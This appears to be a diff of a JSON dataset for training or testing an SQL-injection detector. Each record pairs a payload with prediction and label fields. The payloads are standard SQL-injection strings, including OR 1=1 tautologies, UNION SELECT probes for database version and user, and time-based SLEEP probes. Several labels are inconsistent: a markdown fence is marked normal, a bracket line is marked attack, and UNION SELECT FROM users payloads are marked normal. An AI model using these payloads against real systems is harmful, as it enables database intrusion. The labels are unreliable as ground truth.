@@ -1,149 +1,177 @@
 [
     {
-        "id": "6fb29678-1858-409e-ae30-fb366917fa3f",
+        "id": "bd874c51-36be-47ed-8407-82f90f69ef8f",
         "payload": "```json",
-        "prediction": null,
-        "true_label": null,
+        "prediction": 0,
+        "true_label": 0,
         "type": "normal"
     },
     {
-        "id": "4580cb7f-e578-4406-82c4-ffbb204b4b14",
+        "id": "d2072bce-a194-437e-a6dc-fcd5f7f28ecf",
         "payload": "[",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
     },
     {
-        "id": "7cac4621-c089-4b4b-acde-9953116e8e85",
-        "payload": "  \"' OR 1=1 -- \",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
+        "id": "a41a731f-602c-49d6-be7e-bb51b225aae8",
+        "payload": "  \"' OR '1'='1\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
     },
     {
-        "id": "ac76a450-b104-42f6-a4c8-c0b796e19a6a",
+        "id": "b4d2aabd-a088-401b-8da9-e0b687a8ffae",
         "payload": "  \"' OR '1'='1' -- \",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
     },
     {
-        "id": "52a099d3-730e-4959-8ca1-d8d2f4b7e9f4",
-        "payload": "  \"' OR 1=1 #\",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "6af46be9-5e40-4556-981e-f6fd7bd992f2",
+        "id": "ebea61c8-f524-4c05-8803-db9d2fe1eb06",
         "payload": "  \"' OR '1'='1' #\",",
-        "prediction": null,
-        "true_label": null,
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "0f3d7dad-277a-4206-b377-85560591858b",
+        "payload": "  \"' OR 1=1 -- \",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "4647256d-dec1-4496-9d07-f2d763624763",
+        "payload": "  \"' OR 1=1 #\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "b52d4f3a-682b-49a2-9694-bd32d9cd7bb6",
+        "payload": "  \"' OR 1=1 -- a\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "e676e89c-26b4-4b54-b4ab-5b8a25412f52",
+        "payload": "  \"' OR 1=1 # a\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "b2199762-60b6-44a1-beae-92d46661c545",
+        "payload": "  \"' OR 1=1 OR 'a'='a\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "0a646d55-7f05-4579-b08b-ba80c9db5d0f",
+        "payload": "  \"' OR 1=1 OR 'a'='a' -- \",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "d51d4628-94ff-4b13-8b60-10a1260129b6",
+        "payload": "  \"' OR 1=1 OR 'a'='a' #\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "48f1cca6-3ed3-46e7-a0d5-b33cc65587f3",
+        "payload": "  \"' UNION SELECT 1,2 -- \",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "89185420-e8ba-4710-bf78-386d45116971",
+        "payload": "  \"' UNION SELECT 1,2 #\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "870b385a-1295-4216-92bc-eaf99d526a61",
+        "payload": "  \"' UNION SELECT null,null -- \",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "835a73f0-a2d3-45ac-a6b6-e40ea8a0242c",
+        "payload": "  \"' UNION SELECT null,null #\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "ec83c9ed-75ed-480e-986a-39eaacfd79b9",
+        "payload": "  \"' UNION SELECT @@version,database() -- \",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "abe36f40-d061-4764-9ad2-8118796479aa",
+        "payload": "  \"' UNION SELECT @@version,database() #\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "96899b88-8a38-4f6c-85bd-85340c6b47fb",
+        "payload": "  \"' UNION SELECT user(),database() -- \",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "d2e93f07-14e1-4909-92e6-a7c4b69d699f",
+        "payload": "  \"' UNION SELECT user(),database() #\",",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
+    },
+    {
+        "id": "70d09956-e881-4ba2-87ef-99d7ad23581b",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM users -- \",",
+        "prediction": 0,
+        "true_label": 0,
         "type": "normal"
     },
     {
-        "id": "f6197db2-a124-446e-bc42-4bdba17aff9d",
-        "payload": "  \"' OR 1=1 UNION SELECT 1,2 -- \",",
-        "prediction": null,
-        "true_label": null,
+        "id": "464f0387-c1ee-4a6d-aaa1-11188f921f88",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM users #\",",
+        "prediction": 0,
+        "true_label": 0,
         "type": "normal"
     },
     {
-        "id": "77110d3c-e36e-4bda-9647-203412bfeba5",
-        "payload": "  \"' OR 1=1 UNION SELECT 1,2 #\",",
-        "prediction": null,
-        "true_label": null,
+        "id": "b8aadacd-4ea4-4b10-8a17-7904baac1af4",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM information_schema.users -- \",",
+        "prediction": 0,
+        "true_label": 0,
         "type": "normal"
     },
     {
-        "id": "84c489e1-1f09-4d69-b9f4-c00724453a1e",
-        "payload": "  \"' OR 1=1 UNION SELECT null,null -- \",",
-        "prediction": null,
-        "true_label": null,
+        "id": "b9bb005e-80e7-48ca-9b53-1e05dfbb2dc8",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM information_schema.users #\",",
+        "prediction": 0,
+        "true_label": 0,
         "type": "normal"
     },
     {
-        "id": "84a2e44d-4d49-49e3-8d68-826c5d62d95f",
-        "payload": "  \"' OR 1=1 UNION SELECT null,null #\",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "d1c7bf80-438d-4630-8d4b-61752a82411d",
-        "payload": "  \"' OR 1=1 UNION SELECT 'a','b' -- \",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "0a96fba6-4724-4097-bf4d-a474a40f4c8a",
-        "payload": "  \"' OR 1=1 UNION SELECT 'a','b' #\",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "a309eb35-2235-4fdc-8d2b-479234ea38e5",
-        "payload": "  \"' OR 1=1 UNION SELECT database(),version() -- \",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "2dccf94e-7dab-4f96-baed-5da8f6ade2e5",
-        "payload": "  \"' OR 1=1 UNION SELECT database(),version() #\",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "d81be7d1-f793-4d4f-a21d-5052db2be4aa",
-        "payload": "  \"' OR 1=1 UNION SELECT user(),database() -- \",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "9cb0db44-3775-478f-9958-4935f28181c7",
-        "payload": "  \"' OR 1=1 UNION SELECT user(),database() #\",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "5a833916-95e8-4cf2-bd27-2bcae0b3e515",
-        "payload": "  \"' OR 1=1 UNION SELECT 1,SLEEP(5) -- \",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "dcd2891c-0884-4719-b5c9-9cf1b742ae7d",
-        "payload": "  \"' OR 1=1 UNION SELECT 1,SLEEP(5) #\",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "0220a88e-8504-44fc-961b-4d924a5fd421",
-        "payload": "  \"' OR 1=1 UNION SELECT SLEEP(5),1 -- \",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "9db53d1d-64bb-40e9-96b3-9b9132781edd",
-        "payload": "  \"' OR 1=1 UNION SELECT SLEEP(5),1 #\",",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
-    },
-    {
-        "id": "9d88381d-9b63-4920-9e69-de6abd351123",
-        "payload": "  \"' OR 1=1 UNION SELECT BENCHMARK(10",
-        "prediction": null,
-        "true_label": null,
-        "type": "normal"
+        "id": "39647f42-a69b-4e7f-b6dc-1d95f36d4709",
+        "payload": "  \"' UNION SELECT 1, (SELECT database",
+        "prediction": 1,
+        "true_label": 1,
+        "type": "attack"
     }
 ]
